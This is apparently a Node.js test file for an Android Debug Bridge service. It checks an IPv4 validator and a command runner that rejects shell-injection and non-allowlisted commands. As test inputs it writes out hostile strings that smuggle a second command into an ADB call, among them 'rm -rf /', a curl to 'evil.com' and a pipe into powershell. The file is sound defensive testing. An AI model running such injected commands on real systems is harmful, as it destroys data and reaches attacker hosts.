const test = require('node:test');
const assert = require('node:assert');
const adbService = require('../src/services/adbService');
const { isValidIp } = require('../src/utils/networkUtils');

test('Network utility validates IPv4 addresses correctly', (t) => {
  assert.strictEqual(isValidIp('192.168.1.105'), true);
  assert.strictEqual(isValidIp('10.0.0.1'), true);
  assert.strictEqual(isValidIp('127.0.0.1'), true);
  assert.strictEqual(isValidIp('999.999.999.999'), false);
  assert.strictEqual(isValidIp('localhost'), false);
  assert.strictEqual(isValidIp(''), false);
});

test('Safe ADB command runner rejects shell injection attacks', async (t) => {
  // Disallowed dangerous characters
  await assert.rejects(
    async () => {
      await adbService.runSafeAdbCommand('dummy', 'adb devices; rm -rf /');
    },
    { message: /disallowed operators/i }
  );

  await assert.rejects(
    async () => {
      await adbService.runSafeAdbCommand('dummy', 'adb devices && curl evil.com');
    },
    { message: /disallowed operators/i }
  );

  await assert.rejects(
    async () => {
      await adbService.runSafeAdbCommand('dummy', 'adb shell | powershell.exe');
    },
    { message: /disallowed operators/i }
  );
});

test('Safe ADB command runner rejects non-allowlisted commands', async (t) => {
  await assert.rejects(
    async () => {
      await adbService.runSafeAdbCommand('dummy', 'cmd.exe /c dir');
    },
    { message: /not in the safe allowlist/i }
  );

  await assert.rejects(
    async () => {
      await adbService.runSafeAdbCommand('dummy', 'powershell -Command Get-Process');
    },
    { message: /not in the safe allowlist/i }
  );
});
